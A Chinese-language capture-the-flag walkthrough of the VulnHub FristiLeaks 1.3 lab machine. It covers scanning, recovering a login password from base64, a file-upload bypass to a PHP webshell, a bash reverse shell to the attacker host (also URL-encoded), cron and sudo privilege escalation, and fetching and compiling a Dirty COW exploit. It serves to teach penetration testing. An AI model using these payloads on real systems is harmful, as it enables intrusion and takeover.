> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ffZjVyVowCYDZ04Aj7uvUw)

靶机下载地址：

https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova.torrent

https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova

环境：

靶机：FristiLeaks v1.3        

网络连接方式：桥接模式     

靶机镜像打开方式：VirtualBox

攻击机：kali，win10              

网络连接方式：桥接模式

  

  

  

  

![](https://mmbiz.qpic.cn/mmbiz_svg/EWo3hwIVSD1zlFFiaMicqic5LFDlHEJXvA6X5F0m6SKpHTFQFd0y6ia6m6riaX21dyuhXiafT9HxhT9DHZtLggt8WCsibicAZLJKoaOk/640?wx_fmt=svg)

信息收集

![](https://mmbiz.qpic.cn/mmbiz_svg/AhLk989Zrl145iaWN3pMS47uCIlWYNdWM6msqNXhY2gyuZjibM93hsTu1mPNPpkfHmreE9uzkEAX5VdpFnHp3KshIfZlnTib3tC/640?wx_fmt=svg)

**1.1、确认 IP**

使用 VirtualBox 打开，IP 自动获取：192.168.50.174

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6ta9sjfITnynibB1xU6rL5icd14O7ln7roTHY6DoRmFFp2c6aFj6BKwWxvw/640?wx_fmt=png)

**1.2、扫描端口和服务**

nmap 扫描端口和服务

nmap -p- -A 192.168.50.174

收集到的信息：

80      http                      思路：web 漏洞

linux 2.6.32-3.10           思路：linux 漏洞提权

php/5.3.3

apache 2.2.15

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6tarTJ7ybbfhklHph3rustUXUicgTujmV59K4YyULjMl5ttxIic64LtQ2IQ/640?wx_fmt=png)

**1.3、收集 web 页面信息**

访问，http://192.168.50.174/  ，收集信息

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taDrq0aeRaiat27HSd2ez2chH3CNyME4ky4wEA5tic803j6l7iavCcaQ0Tg/640?wx_fmt=png)

@meneer, @barrebas, @rikvduijn, @wez3forsec, @PyroBatNL, @0xDUDE, @annejanbrouwer, @Sander2121, Reinierk, @DearCharles, @miamat, MisterXE, BasB, Dwight, Egeltje, @pdersjant, @tcp130x10, @spierenburg, @ielmatani, @renepieters, Mystery guest, @EQ_uinix, @WhatSecurity, @mramsmeets, @Ar0xA

**1.4、扫描目录**

使用 dirb 扫描目录

```
dirb http://192.168.50.174/ /usr/share/wordlists/dirb/big.txt
dirb http://192.168.50.174/ /usr/share/wordlists/dirb/small.txt
dirb http://192.168.50.174/ /usr/share/wordlists/dirb/common.txt  
dirb http://192.168.50.174/ /usr/share/wordlists/dirb/spanish.txt
```

robots.txt  

/beer/

/cola/

/images/

/cgi-bin/

/error/

/icons/

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taGLCUBujT6mibziaTWDErq5ST1m4lVH7zD6WI8dKqj2q745fY6Sy0BZsA/640?wx_fmt=png)

dirbuster 扫描目录

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taicf1SG58Am3CiczclUoONNIW6w0eWIHzzEEn0En7JwL1ib2xDVQ4YUvfQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_svg/EWo3hwIVSD1zlFFiaMicqic5LFDlHEJXvA6X5F0m6SKpHTFQFd0y6ia6m6riaX21dyuhXiafT9HxhT9DHZtLggt8WCsibicAZLJKoaOk/640?wx_fmt=svg)

找 web 漏洞

![](https://mmbiz.qpic.cn/mmbiz_svg/AhLk989Zrl145iaWN3pMS47uCIlWYNdWM6msqNXhY2gyuZjibM93hsTu1mPNPpkfHmreE9uzkEAX5VdpFnHp3KshIfZlnTib3tC/640?wx_fmt=svg)

**2.1、访问扫描的目录和页面**

robots.txt 里有三个目录

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6tapcrqEArCZdmN1M6N5DBjdJtKyHUJwL5LYR4t7xGvl1AA6A4o4CfU0Q/640?wx_fmt=png)

访问各目录，全是一张图，这不是你要找的 URL。。。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6tarm9tR8vXtkw7gic4j0VicK58qCDp24WOMrribjSr79X28Jeiac3S209fRQ/640?wx_fmt=png)

扫描出来的内容访问了一遍，没有发现什么有用的东西。。。GG。。

**2.2、没想到的思路和方向**

回头看下访问主页时的提示：keep calm and drink firsti

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6tanfic5sa6ick0r8kepUEQbQdNnYg6clfUn1AOw7ITey01GuIVXn7mx1vA/640?wx_fmt=png)

访问：http://192.168.50.174/fristi/   ，进入主页面

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6tavYgcpg5GSkGzuCNqaJyJKRGdH4ibDHTDowoTs8zAqjKCgr1GVeQBUrQ/640?wx_fmt=png)

**2.3、获取登陆框账号密码**

看到下方的登陆框，先来一波 SQL 注入，手注失败，尝试 sqlmap，也没有结果

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taLXq8P6LXkZBic6ibRzL9QJPlB6nJicjkvazgj5UOyfNnlSv6jdsunyKng/640?wx_fmt=png)

右键看下页面源代码，content 内容里面有些提示：

super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it.

这个页面的图片是经过 base64 编码打开的

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taJl8Ldeaycic8ic6w2AF47LibW5ojSAN0YVcaDyhXphvjN6TARrsBIib4dg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6ta4cW2ZFWjaxnaCicGnP0OjagXI4ODDBWVDh2EIR2X3a7PtaKvMfJrCkw/640?wx_fmt=png)

页面下方确实也留下了一些 base64 编码的内容

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6tafdx5EZ3YCY9VtbGFNke6oNQS30icEWWmsjmb5EOsUERjjBx9bw01Qicw/640?wx_fmt=png)

直接复制 base64 编码的内容在火狐浏览器中打开，页面会弹出一个保存文件的提示，点击保存发现是一个不带格式的文件

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taSThrZTZC0WDX6SY4FNoA1JbRkpVc9LZuYTJhfJ880AAE3gXFEpjckw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taicClCW5SVnzRg8TEttIr7GRJlTJRqiaz0Q0gZeNqKgwKhgicR6SOJ3NRw/640?wx_fmt=png)    

         ![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taXia5ibbJxz1uVMAnmIk11fwzZicfccHSkH4BibObicibAcgeRFYBmnpl0WCA/640?wx_fmt=png)

加个. png 的后缀，发现图片确实是本页面上的那张图片

将刚才网页源代码里面的备注的 base64 编码的内容，添加到

data:img/png;base64 后面，即：

```
data:img/png;base64,iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0klS0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+fm63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJZv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvbDpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNdjJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg104VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLqi1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2FgtOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HKul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12qmD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFheEPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJRU5ErkJggg==
```

将以上内容再复制到浏览器地址栏中打开，发现提示保存文件，下载下来，添加后缀. png，得到以下内容：

```
keKkeKKeKKeKkEkkEk
```

貌似是一个密码，那账户是哪个呢？回头再看下页面提示，发现有个名字  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taoY7wV5NwygskIevzrGwria0BOzljqZLvFOicibwLxKAicXRFggJgiahMjZA/640?wx_fmt=png)

尝试刚才注入的登陆框

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taHrNIrFun8zOVkjJYqL5PBRYZVLCE2eLcEqwcCSicd8VqMnLy0MukBZA/640?wx_fmt=png)

登陆成功，得到一个文件上传的功能点

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taESJMMqoZauHTUnUkAIC6bYyibWsTEjDoAxAw4csuzeEDN7hCWVMqWwA/640?wx_fmt=png)

**2.4、文件上传拿 shell**

http://192.168.50.174/fristi/upload.php

直接上传个 php 文件，提示只允许 png,jpg,gif

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taIdw5bBAlYH9vhicepDGg7SLyuxgRic2Kcf3MbpaUZukYSG18jpcRecnA/640?wx_fmt=png)             

  
![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taZn2Z57UL3PO6amjKGKV5oKXw6AcQ2TO5FXHhyu60Amp3pwEibhKPiaCw/640?wx_fmt=png)

上传个 jpg 图片，上传成功，但是没有路径信息返回。。GG

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6ta77W356XxvDU6s8uDqNMTRIsib7WadYj6fhljUmjlBdFT7TgcYJhILibg/640?wx_fmt=png)

试试扫描下目录，发现 fristi 下有个 / uploads / 的目录

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taw5EL5KdLQ6kuuicfHQiaDH1aSWuZxNcpmoy91ZgpIsFxaxLInuQllqFw/640?wx_fmt=png)

访问下刚上传的图片，确实可以访问的到

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taQic0g1VSlLD4GQibOez1ia9t7yAzpLmfQpUCzicicWh5zlrDGIYWXgg4m8g/640?wx_fmt=png)

给 php 文件加个. jpg 的后缀，发现可以直接上传成功

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taUjn0G5hTt3K7cZuiabawtibUR61ibstpYYDoRic5RwA27XkcLz6xFWfT8A/640?wx_fmt=png)

访问下这张图片，发现显示了内容中的 aaa，说明可以解析 php

http://192.168.50.174/fristi/uploads/post.php.jpg

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taP3icvsW3B6ASBme2TaA91IKCkZIVtQvZwouWYMHjjpcia88vh0RfYMQg/640?wx_fmt=png)

直接用 hackbar 来 post 提交下命令试试，x=whoami

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taSVQicbCy3z1yBQ0OIiaNfMJetW8Uj7vBg2tZXMiaQ1RJLtPe61YkvBV8w/640?wx_fmt=png)

老样子，为了方便提权，反弹下 shell，先用 kali 监听下 9999 端口

```
nc -lvvp 9999
```

post 提交以下 url 编码后的命令

```
x=echo "bash -i >& /dev/tcp/192.168.50.132/9999 0>&1"|bash
```

编码后：

```
x=%65%63%68%6f%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%35%30%2e%31%33%32%2f%39%39%39%39%20%30%3e%26%31%22%7c%62%61%73%68
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taqpCYiaysr4XuC7ibEgRI0Xk8W6Vzmga9ALE5Hn7u3spcRCT0kDH4a4ow/640?wx_fmt=png)

成功反弹 shell

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taUIeA8pRXpYd40a9z2GdXnVlXsRibscTG8bo1ompItZjia50397fTjKnw/640?wx_fmt=png)

用 python 反弹终端

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

![](https://mmbiz.qpic.cn/mmbiz_svg/EWo3hwIVSD1zlFFiaMicqic5LFDlHEJXvA6X5F0m6SKpHTFQFd0y6ia6m6riaX21dyuhXiafT9HxhT9DHZtLggt8WCsibicAZLJKoaOk/640?wx_fmt=svg)

提权

![](https://mmbiz.qpic.cn/mmbiz_svg/AhLk989Zrl145iaWN3pMS47uCIlWYNdWM6msqNXhY2gyuZjibM93hsTu1mPNPpkfHmreE9uzkEAX5VdpFnHp3KshIfZlnTib3tC/640?wx_fmt=svg)

**3.1、查找用户**

查看 / etc/passwd，发现用户 eezeepz，admin，fristigod

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6takB8HJpIuoPMqU1ePHWWAbibMZYfyKLLjtb3taHmBqz3Wz6iau4W34jHA/640?wx_fmt=png)

**3.2、找密码**

查看下当前用户下的文件,/var/www / 目录下，有个 notes.txt，提示 eezeepz 用户的 home 目录下的文件有些乱，需要清理，但不要删除重要任务 - jerry

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taK9k3iaufKIyasyetZPyyh7OUYglKmkPpKWsttFAeuDqFPteNvfWdmWw/640?wx_fmt=png)

另外 / var / 目录下，有一个 fristigod 目录和一个 mail 目录，暂无权限访问

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taXYDUzSJAH9WIvhJib69aGIMvx7IKqjIVejxD6dEOFjIKyEjqVeyiaK6Q/640?wx_fmt=png)

先切换到 / home/eezeepz / 目录下看看，发现也有一个 notes.txt 的文本，查看下

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6ta33yibDm2RicLAx7449NqSjYS4bZCHicicAAmibVXiaaaeNqFQDTS3coTtXPQ/640?wx_fmt=png)

当前用户可以执行 / usr/bin / 下的一些命令，还有一些命令是在 / home/admin / 目录下，

在 / tmp / 目录下创建 runthis 的文件，输出到 cronresult 下

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taYo9anfvPoYbv4ZeBGNBksaUyH8YmBdysibvxnQA9Jd6zZESLdZQybicw/640?wx_fmt=png)

**利用任务计划**

用 vi 编辑器编写时，出现 ESC 以及上下左右按键不能用的情况。。。

最开始的想法是，当前用户没有权限访问 / home/admin / 目录，runthis 每分钟自动执行一次，那直接往文件中写入更改 admin 目录的权限不就好了吗？

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taBWoGAk4OELxyZCNKQ3AB2giaiaKvHibOiaaWf3WRiaTXIosYbQDiaXrzh3rg/640?wx_fmt=png)

发现直接写 chmod -R 777 /home/admin / 几分钟后发现并不会顺利执行更改权限，参考下别人的写法

```
echo "/usr/bin/../../bin/chmod -R 777 /home/admin" >/tmp/runthis
```

... 试了好几次，过了一段时间后发现计划任务就执行成功了，cd 到 admin 用户目录下

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6ta6qgCXkabnicYUibicHZuHKvjdW4htlgGljU4UlWma3bUxWP0LQTDibtibMQ/640?wx_fmt=png)

查看下文件，2 个 txt 对应 2 个编码过后的字符串，第一个像 base64 反过来，尝试 base64 解码，失败

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taeJtnkXe4qgRtmwddVlpjnIBDHFtht2gsVzOROhfMhNaWB11HgxA7cA/640?wx_fmt=png)

**密码解密**

查看下其他文件 cat  cryptpass.py，是一个 python 脚本文件，理下函数执行逻辑，将字符串先用 base64.b64encode 进行 base64 编码，再通过 [::-1] 反向，再通过 codecs.encode 编码，然后返回

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taMjiaeR454FxtFyeibofUkuaOibsyTiaXaNkl9X6BXpYYsRID1290sewSGg/640?wx_fmt=png)

```
import base64,codecs,sys
def encodeString(str):
base64string= base64.b64encode(str)
return codecs.encode(base64string[::-1], 'rot13')
cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

编写一个解码的 python 脚本，如下：

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6tamGf5spUfu5qETRvmI4Kj7VJxC5ZTNetiarjfoBibtabeMF2bVeIiaoVEA/640?wx_fmt=png)

得到两个密码：

thisisalsopw123

LetThereBeFristi!

尝试登陆下 su admin  输入密码 thisisalsopw123 登陆成功

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6tandUCmSnjZBGlvRTWlKPGfVf9WniaCaUnOdicmtXY7T0u3yictAB72qPHA/640?wx_fmt=png)

在该用户下，无法直接提权至 root，也无法访问 fristigod 用户的家目录

**切换到用户 fristigod**

切换至另一个账户 fristigod 试试

尝试登陆下 su fristigod  输入密码 LetThereBeFristi! 登陆成功  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taCQCOp937xhSbXhSL7iczERMcrCF7fhZ9yhRmN1AXgao1rEEqnQ3UnJA/640?wx_fmt=png)

cd 到 fristigod 用户到家目录，发现并没有可以利用的东西，思路到这就断了

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6ta2bJAZCqRMdwkMmR1kyfd3Nib0lorqXIZCPSDtpFuvMkullVyah1L4BQ/640?wx_fmt=png)

**3.3、尝试提权**

回头再看下 / etc/passwd 下的 fristigod 用户信息，目录是位于 / var/fristigod，而非 home

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taHIX6osyfl9ctnHJIghbdp38nBFEe67MpSmXf1JcYw4WMeUuicEaQmvw/640?wx_fmt=png)

切换目录至 / var/fristigod/，查看文件，发现文件

.bash_history 和目录. secret_admin_stuff，分别查看下

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6tavQiasniaSNsdgtrT3JOyIsGictJrgIq6eUACFpkmcjuTUqp3KAd8q7JXA/640?wx_fmt=png)

可以发现在. bash_history 中，通过 sudo -u 来执行一些操作

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taMEwtsj2Q5erqs59fGibIvwKOEXb3VJVckOIbEfejxA6HpGWANjTPLGg/640?wx_fmt=png)

.secret_admin_stuff，有个 doCom 文件，到这就没有提权思路了

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taONvP8QdSMtluTRxzSX5N4lbbPkpuTU3pInyUXo1T99iazLYib1hx8gLQ/640?wx_fmt=png)

**新 get 到的提权方法**

使用 sudo 提升权限，并创建一个 shell：

```
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6ta29pedXpOhROO98wV5jvUt0wBYu4hl7Lzd616uGm4iaiaK59gIIOjxNjw/640?wx_fmt=png)

实现的原理：

通过 sudo -u 可以以 root 身份来执行./doCom，而./doCom 文件，可以执行任何命令，如 ls 等，

通过 / bin/bash 来拿到 root 的 shell

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taQMPWgwFdp26GamIqUfSepVibaBpbxib34RsDy1RSouWRrpr3La0gWxDQ/640?wx_fmt=png)

提权成功

**3.4、提权方式二**

因为 Linux 系统版本为 2.6.32-3.10 ，可以尝试脏牛提权

脏牛漏洞影响的 linux 内核版本为 >=2.6.22（2007 到 2016 年 linux 发行版），因此可以进行脏牛提权

参考链接：

https://www.jianshu.com/p/df72d1ee1e3e

将 dirty 保存在 kali 的 / var/www/html 目录下，这里我是将 dirty.c 改成了 dirty.txt

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taA7qIZdnaoDTJt3v02NBYIkDVLN63QN7xN4ne4XtLdlGuSRWxy6wiaLg/640?wx_fmt=png)

在靶机反弹的 shell 上执行以下命令，下载 dirty.txt 文件

```
wget http://192/168.50.132/dirty.txt
```

**  
编译 dirty.c 文件**

这是因为之前我切换到了 / var/tmp / 目录下，所以就下载到了 / var/tmp / 目录下

然后通过 mv dirty.txt dirty.c 将文件名改回来，并执行以下命令编译：

```
gcc -pthread dirty.c -o dirty -lcrypt
```

当前 / var/tmp / 目录下，自动生成 dirty 文件

**执行 dirty，创建用户**

通过执行./dirty 然后手动设置密码，或直接执行./dirty root 设置密码为 root

这个命令会自动创建一个用户：firefart，密码 root，并且具有 root 权限

执行完毕后，发现当前反弹的 shell 失效了，不过可以直接通过账户名密码登陆靶机了

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6taMufI2jo5Zg53GDg4N3O97Tj05pkN8ZqszVQxdmdiaRRBxPzIC0hL8vA/640?wx_fmt=png)

提权成功

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6tah6tibXtjHBuM78UD7yw4w1RbUqKkEZc90Wu9mY4iaEAlT9xbtjy3rPMQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_svg/EWo3hwIVSD1zlFFiaMicqic5LFDlHEJXvA6X5F0m6SKpHTFQFd0y6ia6m6riaX21dyuhXiafT9HxhT9DHZtLggt8WCsibicAZLJKoaOk/640?wx_fmt=svg)

总结

![](https://mmbiz.qpic.cn/mmbiz_svg/AhLk989Zrl145iaWN3pMS47uCIlWYNdWM6msqNXhY2gyuZjibM93hsTu1mPNPpkfHmreE9uzkEAX5VdpFnHp3KshIfZlnTib3tC/640?wx_fmt=svg)

1、吃了英语不好的亏 [doge]，没有想到 firsti 这个目录

2、新 get 了一种提权思路，创建 root 的 shell

3、靶机环环相扣，每步都有下一步的提示，nice！

end

  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09mdVRNfOeFuuXKDRd3C6ta8bAkrnA5v0PIW4AoSQo3bo5PkWibC1PGrMBVmQHkaLmZFDseL55oMhA/640?wx_fmt=png)